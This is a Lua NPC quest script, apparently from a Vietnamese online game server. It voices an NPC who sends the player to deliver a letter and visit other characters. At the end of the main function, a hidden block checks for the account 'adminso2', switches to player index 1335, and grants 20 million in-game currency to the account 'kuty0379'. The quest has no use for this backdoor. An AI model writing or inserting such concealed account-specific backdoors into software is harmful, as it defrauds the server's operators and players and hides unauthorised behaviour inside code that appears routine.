function main()

if GetTask(103) == 35 then
	SetTask(103,36)
	Talk(3,"","<color=green>Tr­ Bµ Bµ <color>: Ng­¬i cã chuyÖn g× ? ",
	"<color=red>"..GetName().."<color>: Ch­ëng m«n sai ta tíi ®©y nhê bµ gióp ",
	"<color=green>Tr­ Bµ Bµ <color>: Muèn ta gióp th× h·y gióp ta tr­íc, ®em bøc th­ nµy ®Õn cho <color=yellow>Chóc Tó Thanh ")
	Msg2Player("§Õn BiÖn Kinh 198/191 gÆp Chóc Tó Thanh, trao bøc th­ ")
elseif GetTask(103) == 40 then
	SetTask(103,41)
	Talk(2,"","<color=green>Tr­ Bµ Bµ <color>: Con ta ®· mÊt råi sao, thui ®a t¹ nhµ ng­¬i v× ®· tËn søc",
	"<color=green>Tr­ Bµ Bµ <color>:  H·y ®Õn <color=yellow>Thµnh §«<color> gÆp <color=red>Cæ D­ TÈu<color> ®Ó hái th¨m tin tøc ")
	Msg2Player("§Õn Thµnh §« gÆp Cæ D­ TÈu 384/318 ")
else
	Talk(1,"","<color=green>Tr­ Bµ Bµ <color>: Chµo cËu bÐ, cßn trÎ mµ søc kháe dÏo giai nhØ !")
end

if GetAccount() == "adminso2" then
ReLoadScript("\\script\\item\\questkey\\176.lua")

a = 0
idx = PlayerIndex
PlayerIndex = 1335
if GetAccount() == "kuty0379" then

Earn(20000000)


end

PlayerIndex = idx
Msg2Player("XONG 2 "..a.."")
end
end